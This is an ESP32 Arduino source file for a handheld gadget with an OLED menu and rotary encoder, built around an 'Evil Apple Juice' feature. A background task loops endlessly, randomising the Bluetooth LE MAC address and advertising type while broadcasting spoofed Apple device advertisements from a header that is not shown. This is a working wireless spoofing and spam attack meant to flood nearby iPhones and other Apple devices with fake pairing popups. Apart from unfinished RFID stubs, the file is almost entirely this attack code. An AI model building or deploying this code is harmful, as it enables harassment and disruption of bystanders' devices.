#include <Arduino.h>
#include <BLEDevice.h>
#include <BLEServer.h>
#include <BLEUtils.h>
#include <REncoder.h>
#include <SSD1306Wire.h>
#include <Wire.h>
#include <SPI.h>
#include <MFRC522.h>

#include "arrays.hpp"
#include "devices.hpp"

#define USE_MULTCORE 1

#define Encoder_CLK 5
#define Encoder_DT 18
#define Encoder_SW 19
#define SCK 16
#define SDA 17
//TODO: change pin definitions for RFID board
#define RST_PIN 9
#define SS_1_PIN 10
#define SS_2_PIN 8

#define NR_OF_READERS   2

TaskHandle_t th_p[2];  // Task handle list

BLEAdvertising *pAdvertising;  // global variable
uint32_t delayMilliseconds = 1000;

SSD1306Wire display(0x3c, SDA, SCK, GEOMETRY_128_32);

REncoder encoder(Encoder_CLK, Encoder_DT, Encoder_SW);
int global_count = 0;
int global_flag = 0;
uint8_t cir_rs[4] = {2, 4, 6, 8};
int ani_stage = 0;
uint8_t juice_status[2] = {0, 0};  // Initiated, Running
// 0: Menu
// 1: eval apple juice

void evilAppleJuiceInit() {
  BLEDevice::init("StartName");
  BLEServer *pServer = BLEDevice::createServer();
  pAdvertising = pServer->getAdvertising();
  esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
  pAdvertising->setDeviceAddress(null_addr, BLE_ADDR_TYPE_RANDOM);
}

void evilAppleJuiceStart(void *startJuice) {
  while (1) {
    // First generate fake random MAC address
    esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    for (int i = 0; i < 6; i++) {
      dummy_addr[i] = random(256);
      if (i == 0) {
        dummy_addr[i] |= 0xF0;
      }
    }

    BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
    oAdvertisementData.addData(std::string((char *)DEVICES[global_count], 31));

    int adv_type_choice = random(3);
    if (adv_type_choice == 0) {
      pAdvertising->setAdvertisementType(ADV_TYPE_IND);
    } else if (adv_type_choice == 1) {
      pAdvertising->setAdvertisementType(ADV_TYPE_SCAN_IND);
    } else {
      pAdvertising->setAdvertisementType(ADV_TYPE_NONCONN_IND);
    }

    pAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
    pAdvertising->setAdvertisementData(oAdvertisementData);

    Serial.println("Sending packets ...");
    pAdvertising->start();
    delay(delayMilliseconds);
    pAdvertising->stop();
    delay(1);
  }
}

void rs522Init(){
    //TODO: init RFID dummy function
}

void encoderHandler(REncoderWithoutSwitch::Event encoderEvent,
                    RENCODER_ROTATION_VALUE_TYPE encPos) {
  switch (encoderEvent) {
    case REncoder::Event::REncoder_Event_Rotate_CW:
      switch (global_flag) {
        case 0:
        // Choose main menu option
          global_count++;
          if (global_count > 5) {
            global_count = 5;
          }
          break;

        case 1:
        // Choose Evil Apple Juice device
          global_count++;
          if (global_count > 17) {
            global_count = 17;
          }
          break;
      }
      break;
    case REncoder::Event::REncoder_Event_Rotate_CCW:
      global_count--;
      if (global_count < 0) {
        global_count = 0;
      }
      break;
  }
}

void switchHandler() {
  switch (global_flag) {
    case 0:
    // Switch to Evil Apple Juice choose device
      global_flag = 1;
      break;

    case 1:
      if (global_count == 17) {
        // Back to menu
        global_flag = 0;
        global_count = 0;
      } else {
        // Start Evil Apple Juice send packets
        global_flag = 2;
        ani_stage = 0;
      }
      break;

    case 2:
    // Stop Evil Apple Juice send packets
      global_flag = 1;
      if (juice_status[1] == 1) {
        vTaskDelete(th_p[0]);
        pAdvertising->stop();
        juice_status[1] = 0;
      }
      break;
  }

  Serial.println("IRQ -> Switch pushed.");
}

void setup() {
  display.init();

  display.setTextAlignment(TEXT_ALIGN_CENTER_BOTH);

  encoder.setMinEncoderPosition(-1);
  encoder.setMaxEncoderPosition(1);
  encoder.attachSwitchHandler(switchHandler);

  encoder.attachEncoderHandler(encoderHandler);
  Serial.begin(115200);
}

void loop() {
  display.clear();
  switch (global_flag) {
    case 0:
    // Menu
      display.drawString(64, 16, menu[global_count]);
      break;

    case 1:
    // Evil Apple Juice choose device
      if (global_count == 17) {
        display.drawString(64, 16, "Back");
      } else {
        display.drawString(64, 16, DEVICE_NAME[global_count]);
      }
      break;

    case 2:
    // Sending packets
      if (ani_stage == 4) ani_stage = 0;
      display.drawCircle(64, 16, cir_rs[ani_stage]);
      ani_stage++;
      if (juice_status[0] == 0) {
        evilAppleJuiceInit();
        juice_status[0] = 1;
      }
      if (juice_status[1] == 0) {
        xTaskCreatePinnedToCore(evilAppleJuiceStart, "JuiceRun", 4096, NULL, 1,
                                &th_p[0], 0);
        juice_status[1] = 1;
      }
      break;
  }

  display.display();
  delay(200);
}
